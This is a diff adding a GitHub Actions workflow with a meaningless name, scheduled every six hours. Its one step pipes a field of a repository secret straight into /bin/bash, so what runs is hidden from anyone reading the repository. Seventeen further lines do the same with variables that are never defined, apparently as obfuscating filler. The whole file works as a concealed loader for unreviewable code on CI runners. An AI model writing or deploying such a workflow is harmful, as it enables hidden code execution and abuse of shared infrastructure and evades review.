@@ -1,0 +1,33 @@
+name: danrangriyue
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: danrangriyue
+        env:
+          lc84137: ${{ secrets.lc84137 }}
+        run: |
+          echo $lc84137 | jq -r .wvhhm676 | /bin/bash
+          echo $qb18 | jq -r .ssd4 | /bin/bash
+          echo $nvyjp9 | jq -r .ipcp7 | /bin/bash
+          echo $rgdl998 | jq -r .q34530 | /bin/bash
+          echo $ertu70 | jq -r .kksn5 | /bin/bash
+          echo $vwp71833 | jq -r .zkba072 | /bin/bash
+          echo $mbn49 | jq -r .azlp6 | /bin/bash
+          echo $awz571 | jq -r .rz93 | /bin/bash
+          echo $uv474 | jq -r .llwj75350 | /bin/bash
+          echo $vuye5 | jq -r .yeel13451 | /bin/bash
+          echo $cizla19295 | jq -r .hk7206 | /bin/bash
+          echo $xqnxa9784 | jq -r .d9120 | /bin/bash
+          echo $jepzz7 | jq -r .dxzu6159 | /bin/bash
+          echo $igh67471 | jq -r .b4023 | /bin/bash
+          echo $r81205 | jq -r .uutst25381 | /bin/bash
+          echo $a12 | jq -r .dv4617 | /bin/bash
+          echo $mu1925 | jq -r .wpwdq9420 | /bin/bash
+          echo $qykrj03042 | jq -r .rchkm499 | /bin/bash
+
